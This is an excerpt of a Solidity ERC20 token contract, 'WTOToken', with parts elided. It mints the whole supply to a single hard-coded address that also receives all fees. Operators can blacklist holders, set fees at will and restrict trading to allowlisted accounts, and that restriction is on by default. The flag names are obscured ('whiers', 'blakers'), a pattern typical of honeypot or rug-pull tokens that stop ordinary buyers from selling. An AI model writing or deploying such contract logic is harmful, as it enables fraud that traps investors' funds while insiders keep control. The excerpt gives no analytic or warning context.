...
contract WTOToken is ERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) public Oper;
    mapping (address => bool) public whiers; // excluded fee
    mapping (address => bool) public vpes;
    mapping (address => bool) public blakers; // black list
    ...
    address public fundAddr =0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
    address public marketingAddr =0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
    address public lpRewardAddr=0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
    address public returnBackAddr=0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;


    bool public whiersSwitch=true;
    bool public vpesSwitch = true;
    ...
    modifier onlyOper() {
        require(Oper[_msgSender()], "Not Oper");
        _;
    }

    constructor() payable ERC20("WTOToken", "WTOT")  {
        uint256 totalSupply = 1400000000*1e18;
        swapTokensAtAmount = totalSupply.mul(1).div(10**8); // 0.001%;
        Oper[_msgSender()]=true;
        // Fee Exempt
        whiers[_msgSender()]=true;
        whiers[address(this)] =true;

        _cast(0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041, 500000000*1e18);
        address poolReceiver=0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
        _cast(poolReceiver, 500000000*1e18);
        address airdropReceiver=0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
        _cast(airdropReceiver, 200000000*1e18);
        address whierseceiver=0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041;
        whiers[0x53D7a7FC08141aEAE29F2E7C0Bb91a00307Bb041]=true;
        _cast(whierseceiver, 200000000*1e18);
    }

    receive() external payable {}


    function setSaleAmount(uint256 amount) public onlyOper {
        saleAmount = amount;
    }

    function setSperetention(uint256 speretention) public onlyOper {
        speRetention = speretention;
    }

    function setSwapTokensAtAmount(uint256 amount) public onlyOper {
        swapTokensAtAmount = amount;
    }

    function setBurnArr(address _burnAddr) public onlyOper {
        burnAddr=_burnAddr;
    }

    function setopelit(address addr, bool state) public onlyOwner {
        Oper[addr] = state;
    }

    function setwhiers(address addr, bool state) public onlyOper {
        whiers[addr] = state;
    }

    function setblakers(address addr, bool state) public onlyOper {
        blakers[addr] = state;
    }

    function setvpes(address addr, bool state) public onlyOper {
        vpes[addr] = state;
    }

    // Set switch
    function setswitch(bool _brSwitch,bool _saSwitch,bool _transSwitch) public onlyOper {
        brSwitch=_brSwitch;
        saSwitch=_saSwitch;
    ...
    // Set member switch
    function setuseswitch(bool _whiersSwitch,bool _vpesSwitch) public onlyOper {
        whiersSwitch=_whiersSwitch;
        vpesSwitch=_vpesSwitch;
    }

    function setBRFeeRate(uint256 _brLpRewardRate,uint256 _brFundRate,uint256 _brbrMarketingRate,uint256 _brBurnRate,uint256 _brReturnRate) public onlyOper {
    ...
    function setSAFeeRate(uint256 _saLpRewardRate,uint256 _saFundRate,uint256 _saMarketingRate,uint256 _saBurnRate,uint256 _saReturnRate) public onlyOper {
    ...
    function setTransFeeRate(uint256 _transLpRewardRate,uint256 _transFundRate,uint256 _transMarketingRate,uint256 _transBurnRate,uint256 _transReturnRate) public onlyOper {
    ...
    function setReceiver(address _marketingAddr,address _fundAddr,address _returnBackAddr,address _lpRewardAddr) public onlyOper {
    ...
    function _getTypeFee(address _sender, address _recipient) private view returns (string memory, bool) {
        ...
        if(whiers[_sender] || whiers[_recipient]) {
    ...
    function _transfer(
        ...
        require(!blakers[from],"ERC20: in list");

        if(amount == 0) { super._transfer(from, to, 0); return;}
        (string memory tradeType,bool takeFee)=_getTypeFee(from,to);
        if (!isEqual(tradeType,"transfer")){
            if (whiersSwitch) {
                require(whiers[from]|| whiers[to],"ERC20: Only tion");
            } else{
                if(vpesSwitch) {
                    require(vpes[from]|| vpes[to],"ERC20: Only eration");
                }
            }
        }
    ...
    function importwhiers(address[] calldata _accounts) public onlyOper{
        for(uint i=0;i<_accounts.length;i++){
            whiers[_accounts[i]]=true;
        }
    }

    function importvpes(address[] calldata _accounts) public onlyOper{
        for(uint i=0;i<_accounts.length;i++){
            vpes[_accounts[i]]=true;
        }
    }
